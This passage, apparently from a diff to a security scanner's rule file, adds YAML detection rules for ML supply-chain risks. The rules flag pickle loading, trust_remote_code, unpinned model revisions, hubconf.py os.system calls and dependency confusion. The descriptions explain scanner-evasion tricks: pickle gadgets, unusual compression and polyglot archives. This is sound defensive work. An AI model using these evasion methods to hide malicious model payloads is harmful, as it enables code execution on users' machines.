+  message: LoRA/PEFT adapter loaded without integrity verification — malicious adapter
+    supply chain risk
+  description: 'LoRA (Low-Rank Adaptation) and PEFT adapter loading without integrity
+    verification. Malicious LoRA adapters are a growing attack vector: an attacker
+    uploads a seemingly useful fine-tuning adapter to Hugging Face that contains pickle-serialized
+    malicious payloads in adapter weights. PeftModel.from_pretrained() follows the
+    same code execution path as standard model loading, inheriting all trust_remote_code
+    risks documented by Siddiq et al. (2026). Kellas et al. (2025) confirmed that
+    44.9% of popular Hugging Face models use insecure pickle format — this includes
+    adapter files. Adapter files are smaller and more numerous than base models, making
+    them harder to audit individually. The adapter ecosystem (LoRA, QLoRA, IA3, adapter-transformers)
+    represents a distinct and growing supply chain attack surface distinct from base
+    model loading.
+
+    '
+  remediation: 'Pin PEFT adapter downloads to specific commit hashes. Verify adapter
+    file SHA-256 hashes before loading. Use set_peft_model_state_dict() with weights
+    loaded via torch.load(path, weights_only=True). Audit adapter source code in repository
+    before use. Prefer safetensors-format adapters when available.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-024
+  name: nemo-model-archive-unsafe-load
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)nemo\.collections\..*restore_from\s*\(
+  - (?i)\.nemo.*(?:pickle|pkl|torch\.load)
+  - (?i)ModelPT\.restore_from\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: NVIDIA NeMo .nemo model archive loaded — archive format contains embedded
+    pickle payloads
+  description: 'NVIDIA NeMo .nemo model files are tar archives containing pickle-serialized
+    model weights and configuration. Liu et al. (2025) specifically identified NeMo
+    archive format as one of 22 model loading paths across five AI/ML frameworks,
+    noting it was among the 19 paths entirely missed by existing model scanners (PickleScan,
+    ModelScan, Hugging Face PickleScanning, ProtectAI scanner). The tar archive encapsulation
+    allows malicious pickle payloads to bypass scanners that only check top-level
+    pickle files. Liu et al. documented archive format evasion as a distinct attack
+    class: malicious pickle payload embedded within an archive bypasses scanners checking
+    only surface-level file types.
+
+    '
+  remediation: 'Manually inspect .nemo archive contents before loading (extract tar,
+    scan constituent .pkl files with Fickling). Verify SHA-256 hash of .nemo archive
+    against publisher-provided hash. Load only from trusted, verified NeMo model sources.
+    Use ModelScan v2+ which attempts to handle archive formats. Monitor NeMo restore_from()
+    call sites in pipelines.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-025
+  name: huggingface-cache-directory-tampering
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)\.cache[/\\]huggingface[/\\]hub[/\\].*(?:write|replace|modify|delete|shutil\.copy|shutil\.move)
+  - (?i)HUGGINGFACE_HUB_CACHE\s*=\s*['"][^'"]{1,}['"]
+  - (?i)HF_HOME\s*=\s*['"](?!/home/[^/]+/\.cache)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.sh'
+  - '*.bash'
+  - '*.yaml'
+  - '*.yml'
+  message: Hugging Face local cache directory modification detected — potential AiTM
+    cache poisoning
+  description: 'Modification of Hugging Face local cache directory (~/.cache/huggingface/).
+    Siddiq et al. (2026) documented Attacker-in-the-Middle (AiTM) cache poisoning
+    as the third attack scenario (S3): attacker poisons or replaces cached model artifacts
+    in ~/.cache/huggingface/ so that future loads execute the attacker''s payload
+    even if the upstream repository is clean. This is particularly dangerous in shared
+    ML infrastructure (notebooks, CI/CD) where multiple users share a model cache.
+    Writing to or redirecting HF_HOME to an attacker- controlled path allows substitution
+    of model weights before model loading. Havryliak (2025) documented analogous Git
+    LFS cache poisoning with the same core mechanism.
+
+    '
+  remediation: 'Protect the Hugging Face cache directory with filesystem permissions
+    (read-only for non-privileged users). Monitor for unexpected writes to ~/.cache/huggingface/.
+    Use immutable cache volumes in containerized ML workloads. Validate model hashes
+    after loading from cache. Treat HUGGINGFACE_HUB_CACHE and HF_HOME environment
+    variables as security-sensitive configuration.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-426
+- id: MEDUSA-MLSC-SCAN-026
+  name: model-hub-hubconf-rce-pattern
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)torch\.hub\.load\s*\([^)]*trust_repo\s*=\s*True
+  - (?i)hubconf\.py.*os\.system
+  - (?i)hubconf\.py.*subprocess\.run
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: PyTorch Hub hubconf.py RCE pattern — trust_repo=True enables arbitrary
+    code execution
+  description: 'PyTorch Hub model loading with trust_repo=True or hubconf.py containing
+    OS command execution. Siddiq et al. (2026) found PyTorch Hub to be the highest-risk
+    platform measured: all 26 PyTorch Hub repositories use custom code, CWE-78 (OS
+    Command Injection) is the dominant weakness at 35.90% of findings, and 12/26 repositories
+    (46.15%) contain security issues. hubconf.py is executed automatically by torch.hub.load()
+    when trust_repo=True. CWE-78 instances in hubconf.py create direct shell injection
+    opportunities. Zhao et al. (ASE ''24) documented unsafe subprocess and os.system
+    calls as top findings in model code containing dangerous APIs.
+
+    '
+  remediation: 'Never use torch.hub.load() with trust_repo=True unless hubconf.py
+    has been manually reviewed. Download hubconf.py and model weights separately,
+    audit the source code, then load locally. Prefer Hugging Face Hub over PyTorch
+    Hub for models where both options exist. Implement pre-load code review gates
+    for any use of PyTorch Hub in production pipelines.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-78
+- id: MEDUSA-MLSC-SCAN-027
+  name: github-actions-ml-pipeline-injection
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)uses:\s*[A-Za-z0-9_-]+/[A-Za-z0-9_-]+@(?!v[0-9]|[a-f0-9]{40})
+  - (?i)pip\s+install\s+[^-][^\s]*\s*(?!==|>=|<=|~=)
+  - (?i)run:\s*.*torch\.load\s*\(.*(?:env|github\.event|inputs)
+  file_types:
+  - '*.yaml'
+  - '*.yml'
+  - .github/workflows/*.yaml
+  - .github/workflows/*.yml
+  message: GitHub Actions ML pipeline step without pinned version — supply chain injection
+    risk
+  description: 'GitHub Actions workflow using unpinned action references or installing
+    unpinned ML packages in CI/CD pipelines that process ML models. Kalu & Davis (2025)
+    argue that artifacts traversing trust boundaries (mirrors, corporate proxies,
+    CI/CD runners) lose registry security guarantees, enabling package or action substitution.
+    Using `uses: owner/action@main` (branch reference) instead of `uses: owner/action@sha256hash`
+    allows the action to be updated with malicious code. Unpinned pip install in ML
+    training pipelines can pull typosquatted or compromised packages. Pautsch et al.
+    (2025) noted that autonomous agents inheriting compromised dependencies cascade
+    the attack.
+
+    '
+  remediation: 'Pin all GitHub Actions to specific commit SHAs (uses: owner/action@sha256).
+    Pin all Python dependencies with exact versions and hashes (pip install --require-hashes).
+    Use dependabot for automated dependency auditing. Implement OIDC-based attestation
+    for build artifacts. Separate model training from model serving pipelines to limit
+    blast radius of CI/CD compromise.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-028
+  name: model-card-injection-attack
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)README\.md.*(?:eval|exec|import os|subprocess|__import__)
+  - (?i)model_card.*(?:<script|javascript:|data:text/html)
+  - (?i)---\s*[\s\S]*?\s*---.*(?:url|file):\s*(?:http|/)
+  file_types:
+  - '*.md'
+  - README.md
+  message: Model card (README.md) contains executable code patterns — potential injection
+    via model card rendering
+  description: 'Model card (README.md) contains patterns suggesting code injection
+    via model card metadata or rendered content. Stalnaker et al. (2025) analyzed
+    760,460 Hugging Face model cards and found widespread documentation shortcomings
+    and self-reported metadata with no verification mechanism. Meiklejohn et al. (2025)
+    noted model cards rely entirely on self-reported data — they enable provenance
+    fraud through unverifiable claims. Malicious actors can embed JavaScript in model
+    card markdown rendered by web UIs, or embed executable code in YAML frontmatter
+    that is parsed by automated ML tooling. Model card YAML frontmatter is processed
+    programmatically by huggingface_hub library and can contain URLs or file paths
+    resolved during metadata loading.
+
+    '
+  remediation: 'Sanitize model card content before rendering in web UIs. Validate
+    YAML frontmatter against a strict schema, rejecting unexpected URL or file path
+    values. Never execute code snippets found in model cards without review. Treat
+    model card metadata as untrusted input in automated tooling that processes it.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-79
+- id: MEDUSA-MLSC-SCAN-029
+  name: dependency-confusion-ml-internal-package
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)--extra-index-url\s+https?://(?!pypi\.org|files\.pythonhosted\.org)
+  - (?i)--index-url\s+https?://(?!pypi\.org|files\.pythonhosted\.org)
+  - (?i)pip\.conf.*index-url.*(?:internal|corp|private|local)
+  file_types:
+  - '*.txt'
+  - '*.cfg'
+  - '*.toml'
+  - '*.sh'
+  - '*.bash'
+  - pip.conf
+  message: Custom pip index URL configured — dependency confusion attack risk for
+    ML packages
+  description: 'Custom pip index URL configured alongside or instead of PyPI, creating
+    dependency confusion risk. Kalu & Davis (2025) document how artifacts traversing
+    trust boundaries lose registry security guarantees — a core mechanism of dependency
+    confusion attacks where a malicious package on the public PyPI registry with a
+    higher version number takes precedence over an internal private package. This
+    is particularly dangerous for ML packages: an attacker who knows internal package
+    names (e.g., from leaked requirements.txt in a public ML project) can upload a
+    higher-versioned malicious package to PyPI that gets installed instead of the
+    internal one. Kalu & Davis argue signing is the only portable defense that survives
+    this boundary crossing.
+
+    '
+  remediation: 'Use --only-binary-source or --no-index with explicit --find-links
+    for internal packages to prevent PyPI fallback. Implement package signing verification
+    for all ML dependencies. Use virtual environment isolation. Consider private Artifact
+    Registry with allowlisted packages only. Audit requirements files for internal
+    package names and ensure they are not accidentally published publicly.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1357
+- id: MEDUSA-MLSC-SCAN-030
+  name: model-weight-remote-fetch-in-init
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)def\s+__init__\s*\(.*\).*[\s\S]{0,200}urllib\.request\.urlopen
+  - (?i)def\s+__init__\s*\(.*\).*[\s\S]{0,200}requests\.get\s*\(
+  - (?i)def\s+forward\s*\(.*\).*[\s\S]{0,200}(?:download|fetch|urlopen)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Model __init__ or forward() fetches remote resources at runtime — potential
+    data exfiltration or runtime supply chain attack
+  description: 'Model __init__ or forward() method fetches remote resources (weights,
+    code, data) at runtime. Siddiq et al. (2026) identified CWE-494 (No Integrity
+    Check) as a widespread weakness: 3,803 instances of unsafe Hugging Face Hub downloads
+    in custom code (B615). Zhao et al. (ASE ''24) documented Unsafe API patterns including
+    urllib.request.urlopen and network access patterns in model code classified in
+    Table 3 under Network category of dangerous APIs. Runtime weight fetching from
+    within model inference code allows attackers who compromise the model weight server
+    to inject malicious content after model deployment, bypassing pre-deployment security
+    scanning.
+
+    '
+  remediation: 'All model weights and resources should be fetched at model loading
+    time (not inference time) with integrity verification. Never embed network calls
+    in model forward() passes. Cache all resources locally with hash verification.
+    Implement egress filtering on ML inference containers to prevent unexpected network
+    calls during inference.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-031
+  name: training-data-url-without-hash
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)download_url\s*=\s*['"]https?://[^'"]+['"](?!.*sha256)
+  - (?i)data_url\s*=\s*['"]https?://[^'"]+['"](?!.*hash)
+  - (?i)wget\s+https?://[^\s]+\s+(?!-c.*sha|--checksum)
+  file_types:
+  - '*.py'
+  - '*.sh'
+  - '*.bash'
+  - '*.yaml'
+  - '*.yml'
+  message: Training data downloaded from URL without hash verification — expired domain
+    hijacking risk
+  description: 'Training data being downloaded from a URL without hash verification.
+    Vassilev et al. (NIST AI 100-2e2023, 2024) document Training Data Poisoning via
+    Expired Domain Hijacking as a concrete AI supply chain attack: foundation model
+    datasets list URLs (not content hashes) pointing to training data sources. An
+    attacker purchases an expired domain and replaces resources with poisoned data.
+    Only 0.001% of web-scale data poisoned is sufficient to induce targeted failures
+    (Carlini et al.). Foundation model training pipelines (requiring ~11T tokens for
+    500B parameter models) make reliance on scraped web data inevitable. NIST explicitly
+    recommends cryptographic hash verification of training data content alongside
+    URLs as the primary mitigation.
+
+    '
+  remediation: 'Publish and verify SHA-256 content hashes for all training data files
+    alongside URLs. Use Merkle tree commitments (Meiklejohn et al. 2025) for verifiable
+    training data provenance. Cache training data with hash verification before training
+    runs. Monitor training data domains for expiration and ownership changes. Use
+    dataset versioning with content-addressed storage (e.g., DVC with SHA-256 content
+    hashing).
+
+    '
+  owasp_llm: LLM04:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-032
+  name: synthetic-data-loop-without-provenance
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)generate\s*\(.*\).*(?:dataset|train|fine.?tun)
+  - (?i)model\.generate\s*\(.*max_new_tokens.*\).*to_csv|to_json|save
+  - (?i)synthetic.*data.*(?:model\.generate|pipeline|llm\.complete)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Synthetic training data generated from model output without provenance
+    tracking — recursive supply chain contamination risk
+  description: 'Model-generated synthetic data being used as training data without
+    provenance tracking. Stalnaker et al. (2025) identified Synthetic Data Loop Risk
+    as a distinct ML supply chain attack: generative model outputs fed back into training
+    datasets create recursive supply chain loops. A compromised base model generating
+    synthetic training data poisons future model generations. This chain of contamination
+    is difficult to detect without full provenance tracking. Stalnaker et al. analyzed
+    760,460 Hugging Face models and found non-linear supply chain dependencies (fine-tuning,
+    distillation, quantization) that make tracing base model compromise through downstream
+    models extremely difficult.
+
+    '
+  remediation: 'Track provenance of all synthetic training data including the model
+    version, prompt template, and generation parameters used. Implement Merkle tree
+    commitments (Meiklejohn et al. 2025) for training dataset versioning. Maintain
+    model cards with explicit dependency graphs for fine-tuning and distillation chains.
+    Avoid using outputs of unknown or unverified models as training data.
+
+    '
+  owasp_llm: LLM04:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-033
+  name: pickle-gadget-indirect-execution
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)pydoc\.locate\s*\(
+  - (?i)doctest\.run_docstring_examples\s*\(
+  - (?i)sympy.*lambdify\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Indirect code execution gadget (pydoc/doctest/sympy) used in ML context
+    — potential pickle gadget exploitation
+  description: 'Indirect code execution via library gadgets (pydoc, doctest, sympy)
+    in ML code. Liu et al. (2025) discovered 133 exploitable function gadgets across
+    built-in, AI/ML, and dependency libraries that attackers use instead of calling
+    dangerous functions directly. Instead of os.system() (which scanners monitor),
+    attackers invoke wrapper functions in legitimate libraries that internally call
+    dangerous operations. pydoc.locate() can execute arbitrary code when resolving
+    module paths. doctest functions execute embedded code in docstrings. sympy.lambdify()
+    converts symbolic expressions to executable Python. Liu et al. demonstrated near-100%
+    scanner bypass rate using these gadgets and 89% bypass rate against the best-performing
+    individual scanner. Kellas et al. (2025) confirmed existing scanners fail to detect
+    known malicious models.
+
+    '
+  remediation: 'Scan ML model code for indirect gadget usage using PICKLECLOAK (Liu
+    et al. 2025) or PickleBall (Kellas et al. 2025) which analyze the full callable
+    graph. Flag any occurrence of pydoc.locate, doctest execution, or sympy.lambdify
+    in model deserialization contexts as requiring manual review. Prefer allowlist-based
+    loading over denylist approaches to handle the 133+ known gadget variants.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-034
+  name: polyglot-model-file-zip-pickle
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)zipfile\.ZipFile\s*\(.*\.(?:pt|pth|pkl|model)\s*['"]
+  - (?i)tarfile\.open\s*\(.*\.(?:nemo|model|pt)\s*['"]
+  - (?i)\.pt['"].*zipfile\.is_zipfile
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Polyglot model file handling detected — zip+pickle dual-format file evades
+    format-specific scanners
+  description: 'Polyglot model file handling where files are simultaneously valid
+    as both ZIP archives and pickle payloads. Liu et al. (2025) documented File Archive
+    Format Evasion as a distinct attack class: PyTorch, Keras, and NeMo package model
+    artifacts into archive formats (zip, tar). Malicious pickle payloads embedded
+    within these archives bypass scanners that only check top-level pickle files.
+    PyTorch .pt files are zip archives containing pickle-serialized data.pkl and storage
+    tensors. A malicious .pt file can be crafted as a valid zip that extracts a malicious
+    pickle payload while appearing as a normal model archive. Liu et al. found 19/22
+    model loading paths are entirely missed by existing scanners precisely because
+    they handle archive-embedded pickle content.
+
+    '
+  remediation: 'Scan archive contents recursively, not just the outer file format.
+    Use Fickling to disassemble pickle streams inside zip archives. Implement PICKLECLOAK
+    (Liu et al. 2025) for comprehensive loading path coverage. Verify the expected
+    structure of PyTorch zip archives (should contain data.pkl + storage files only,
+    not executables).
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-035
+  name: model-compression-format-evasion
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)joblib\.load\s*\(.*compress\s*=\s*['"](?:lzma|bz2|zlib)['"]
+  - (?i)lzma\.open\s*\(.*\.(?:pkl|pth|model)\s*['"]
+  - (?i)bz2\.open\s*\(.*\.(?:pkl|pth|model)\s*['"]
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Non-standard compression in ML model loading — evasion of scanners that
+    only handle default compression
+  description: 'Non-standard compression algorithms (lzma, bz2, zlib) used in ML model
+    loading context. Liu et al. (2025) documented Compression Algorithm Evasion as
+    a distinct attack vector: joblib supports multiple compression algorithms (gzip,
+    zlib, bz2, lzma). Malicious payloads compressed with less-common algorithms (especially
+    lzma) bypass scanners that only handle default gzip compression. Liu et al. explicitly
+    called out this evasion as one of the 19 loading paths missed by existing scanners.
+    This creates a straightforward scanner bypass: embed a standard pickle RCE payload
+    in a bz2 or lzma-compressed joblib file and all existing scanners fail to parse
+    it. The $6,000 bug bounty received by Liu et al. confirms the severity of these
+    scanner evasion findings.
+
+    '
+  remediation: 'Test model scanner coverage against all compression variants (bz2,
+    lzma, zlib) before deployment. Update model scanning pipeline to decompress with
+    all supported algorithms before analysis. Restrict allowed compression formats
+    for model files in production. Migrate to safetensors format which does not support
+    arbitrary compression payloads.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-036
+  name: huggingface-modelscope-compromised-maintainer
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)from_pretrained\s*\(['"][a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+['"].*revision\s*=\s*['"]main['"]
+  - (?i)snapshot_download\s*\([^)]*revision\s*=\s*['"](?:main|master|latest)['"]
+  - (?i)hf_hub_download\s*\([^)]*revision\s*=\s*['"](?:main|master)['"]
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Model download pinned to mutable branch (main/master/latest) — compromised
+    maintainer attack exposure
+  description: 'Model download from Hugging Face or ModelScope using a mutable branch
+    reference (main, master, latest) instead of a specific commit hash. Siddiq et
+    al. (2026) documented Compromised Maintainer Account Poisoning (S2) as the second
+    major attack scenario: a trusted maintainer account is hijacked and a malicious
+    model uploaded to a legitimate, widely-used repository. Users who trust the model
+    due to reputation, verification badges, or high download counts are exposed. ModelScope
+    showed the highest percentage of custom code repos (4.65%), making it particularly
+    vulnerable. Pinning to main/master means any account compromise or malicious update
+    is automatically consumed by downstream pipelines. Siddiq et al. reported peak
+    4,898 new custom-code repos in April 2025 during DeepSeek/ Llama-4/Qwen-3 release
+    waves.
+
+    '
+  remediation: 'Always pin model downloads to specific commit hashes: revision=''sha256:abc123...''
+    or a full 40-character Git SHA. Never use branch names (main, master) as revision
+    specifiers in production code. Implement automated hash verification in CI/CD
+    pipelines. Monitor for unexpected updates to pinned model versions using Hugging
+    Face webhooks.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-829
+- id: MEDUSA-MLSC-SCAN-037
+  name: modelscope-opencsg-trust-remote-code
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)modelscope.*snapshot_download\s*\([^)]*trust_remote_code\s*=\s*True
+  - (?i)from modelscope.*import.*pipeline
+  - (?i)opencsg\.com.*from_pretrained\s*\([^)]*trust_remote_code
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: ModelScope/OpenCSG model loading with trust_remote_code — higher-risk platform
+    with less mature security controls
+  description: 'ModelScope or OpenCSG model loading with trust_remote_code enabled.
+    Siddiq et al. (2026) found that ModelScope and OpenCSG have significantly less
+    mature security controls than Hugging Face: ModelScope had 15.94% of custom-code
+    repos with CWE-502 (unsafe deserialization) vs 4.60% on Hugging Face; OpenCSG
+    showed B602 (shell=True subprocess) as top high-severity finding at 0.18%. Cross-platform
+    comparison showed enforcement gaps: ClamAV, PickleScan, and ModelScan found no
+    findings in execution- relevant custom code on these platforms because tools are
+    focused on Hugging Face. The highest proportion of custom-code repos was on ModelScope
+    (4.65%) and OpenCSG (3.20%), making trust_remote_code particularly dangerous on
+    these platforms.
+
+    '
+  remediation: 'Apply even stricter scrutiny to models from ModelScope and OpenCSG
+    than Hugging Face, as security control maturity is lower. Audit custom code thoroughly
+    before enabling trust_remote_code. Sandbox execution of models from these platforms.
+    Consider restricting organizational policy to Hugging Face-verified publishers
+    only.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-94
+- id: MEDUSA-MLSC-SCAN-038
+  name: requirements-txt-unpinned-ml-dependencies
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)^(?:torch|transformers|numpy|scikit.?learn|tensorflow|keras|jax|diffusers|peft|trl)(?:\s*$|\s*(?:>|<|!=)[^=])
+  - (?i)^(?:torch|transformers|numpy|scikit.?learn|tensorflow|keras|jax)\s*$
+  - (?i)install_requires.*['"](?:torch|transformers|numpy)(?:['"]|\s*[><!])
+  file_types:
+  - '*.txt'
+  - requirements*.txt
+  - '*.cfg'
+  - '*.toml'
+  message: Core ML dependency without pinned version — substitution attack risk via
+    version range
+  description: 'Core ML package (torch, transformers, numpy, scikit-learn, etc.) listed
+    without a pinned exact version in requirements. Kalu & Davis (2025) argue that
+    package signing is the only defense portable across trust boundaries, but pinning
+    is the baseline prerequisite. An unpinned torch or transformers dependency allows
+    an attacker who uploads a malicious version to PyPI with a higher version number
+    to have it installed automatically. This is the requirements substitution attack
+    vector: attackers monitor for new major ML framework releases and time typosquat
+    or version-bump attacks to coincide. Pearce et al. (2021) noted that ~40% of AI-generated
+    code is vulnerable, and AI assistants commonly generate unpinned requirements.
+
+    '
+  remediation: 'Pin all ML dependencies to exact versions with hash verification:
+    torch==2.4.0 --hash=sha256:... Use pip-compile or uv to generate locked requirements
+    with hashes. Implement automated dependency scanning in CI/CD (Safety, pip-audit).
+    Review requirements file changes in pull requests as security-sensitive.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1357
+- id: MEDUSA-MLSC-SCAN-039
+  name: numpy-load-allow-pickle-true
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)numpy\.load\s*\([^)]*allow_pickle\s*=\s*True
+  - (?i)np\.load\s*\([^)]*allow_pickle\s*=\s*True
+  - (?i)numpy\.lib\.npyio\.load\s*\([^)]*allow_pickle
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: numpy.load() with allow_pickle=True — arbitrary code execution via numpy
+    array deserialization
+  description: 'numpy.load() with allow_pickle=True enables arbitrary code execution
+    via pickled numpy arrays (.npy, .npz files). Casey et al. (2025) explicitly identified
+    numpy among the vulnerable serialization formats capable of object injection (alongside
+    torch.save, pickle, joblib, dill, ONNX, H5/HDF5, torch.jit.save). Zhao et al.
+    (ASE ''24) taxonomy of 15 model formats classified numpy as an insecure serialization
+    format. NumPy previously set allow_pickle=True as the default; since NumPy 1.16.3
+    it defaults to False (CVE-2019-6446 context), but many ML codebases explicitly
+    re-enable it to load legacy model checkpoints. NIST AI 100-2e2023 (Vassilev 2024)
+    cites CVE-2019-6446 directly as a canonical ML serialization vulnerability.
+
+    '
+  remediation: 'Remove allow_pickle=True from all numpy.load() calls. Convert legacy
+    .npy/.npz pickle-based arrays to safetensors format. If pickle in numpy arrays
+    is unavoidable, verify SHA-256 hash of the .npy/.npz file before loading and ensure
+    the source is from a trusted, signed repository.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-040
+  name: copilot-generated-insecure-ml-code
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)#\s*(?:generated by|copilot|gpt|claude|ai.generated).*\n.*(?:pickle\.load|torch\.load|joblib\.load)
+  - (?i)#\s*TODO.*(?:add hash|add verification|verify|check integrity)
+  - (?i)#\s*(?:fixme|hack|temp|unsafe).*(?:pickle|trust_remote_code|allow_pickle)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: AI-generated ML code with known insecure pattern and unresolved security
+    TODO — verify before production use
+  description: 'AI-generated ML code (from Copilot, GPT, Claude, or similar) containing
+    insecure serialization patterns with unresolved security TODOs. Pearce et al.
+    (2021) found approximately 40% of GitHub Copilot-generated programs across 89
+    security scenarios are vulnerable, specifically demonstrating that AI models trained
+    on vulnerable code reproduce vulnerable patterns. In the ML infrastructure context
+    this means Copilot commonly generates pickle.load() without safety checks, torch.load()
+    without weights_only=True, and model downloads without integrity verification.
+    Siddiq et al. (2026) found developer confusion about trust_remote_code pervasive
+    in forum discussions — 418 Hugging Face forum posts analyzed showing persistent
+    misunderstanding of security implications. TODO/FIXME/HACK comments near insecure
+    patterns are a direct indicator of unresolved technical debt in security-critical
+    code.
+
+    '
+  remediation: 'Treat AI-generated ML code containing security-sensitive patterns
+    (pickle, model loading, credential handling) as requiring mandatory security review
+    before merging. Implement pre-commit hooks to flag insecure ML patterns regardless
+    of code origin. Use security- focused AI code review tools rather than accepting
+    AI-generated ML code verbatim.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1357
+- id: MEDUSA-MLSC-SCAN-041
+  name: safetensors-ignored-conversion-pr
+  severity: LOW
+  category: ml_supply_chain
+  patterns:
+  - (?i)\.gitignore.*\.safetensors
+  - (?i)exclude.*safetensors.*requirements
+  - (?i)#\s*TODO.*(?:safetensors|safe.tensors).*migration
+  file_types:
+  - '*.gitignore'
+  - '*.py'
+  - '*.cfg'
+  - '*.toml'
+  message: Safetensors migration deferred — model repository maintaining insecure
+    pickle format by choice
+  description: 'Evidence that safetensors format migration has been explicitly deferred
+    or excluded. Casey et al. (2025) found that despite Hugging Face deploying an
+    automated conversion tool that submits pull requests to convert PyTorch models
+    to safetensors format, the majority of developers ignore these conversion pull
+    requests. Excluding safetensors or having TODO comments indicating deferred migration
+    means the repository continues serving insecure pickle-format models. Kellas et
+    al. (2025) confirmed 44.9% of popular Hugging Face models still use insecure pickle
+    format despite safetensors availability since 2022. Every pickle-format model
+    download is a potential supply chain attack opportunity given the 400M+ monthly
+    download volume documented by Kellas et al.
+
+    '
+  remediation: 'Do not ignore or defer the safetensors conversion pull requests from
+    Hugging Face''s automated tool. Test safetensors compatibility with your model
+    and consumer code. File any compatibility issues as bugs to address rather than
+    reasons to skip migration. The security benefit (elimination of arbitrary code
+    execution) outweighs conversion effort.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1188
+- id: MEDUSA-MLSC-SCAN-042
+  name: model-hub-third-party-library-deception
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)pip\s+install\s+[^-][^\s]+\s+#\s*required for.*model
+  - (?i)custom_code.*pip.*install.*[^><=!]$
+  - (?i)from_pretrained\s*\([^)]*\).*#.*custom.*library
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.md'
+  - README.md
+  message: Model loading requires installation of third-party library — potential
+    third-party library deception attack
+  description: 'Model loading code or documentation instructs users to install a third-party
+    library as a prerequisite. Ding et al. (2025) identified Third-Party Library Deception
+    as a distinct attack technique: attacker creates a malicious third-party Python
+    library combined with a custom configuration file that deceives users into executing
+    it during model loading. This differs from typosquatting — the library name may
+    be entirely novel but is presented as a required dependency for a popular model.
+    Siddiq et al. (2026) documented the trust_remote_code ecosystem creating opportunities
+    for maintainers to list arbitrary pip packages as model requirements. The combination
+    of a legitimate- looking model with a malicious dependency library is harder to
+    detect than either alone.
+
+    '
+  remediation: 'Scrutinize any pip install instructions in model cards or loading
+    code. Verify that required libraries exist on PyPI with legitimate provenance
+    and download history. Sandbox model loading in an isolated environment before
+    installing model-specific dependencies in production. Check the library''s source
+    code on PyPI/GitHub before installation.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1357
+- id: MEDUSA-MLSC-SCAN-043
+  name: mlops-pipeline-model-artifact-no-sbom
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)mlflow\.log_model\s*\([^)]*\)
+  - (?i)wandb\.log_artifact\s*\([^)]*\)
+  - (?i)bentoml\.save_model\s*\([^)]*\)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: MLOps model artifact logged without SBOM or supply chain metadata — provenance
+    tracing gap
+  description: 'Model artifact logged to MLOps tracking system (MLflow, W&B, BentoML)
+    without Software Bill of Materials (SBOM) or supply chain provenance metadata.
+    Stalnaker et al. (2025) analyzed 760,460 Hugging Face models and found widespread
+    documentation shortcomings that prevent tracing of supply chain dependencies —
+    fine-tuning chains, distillation relationships, and training data provenance.
+    Kalu & Davis (2025) argue that SBOM-style dependency graphs are essential for
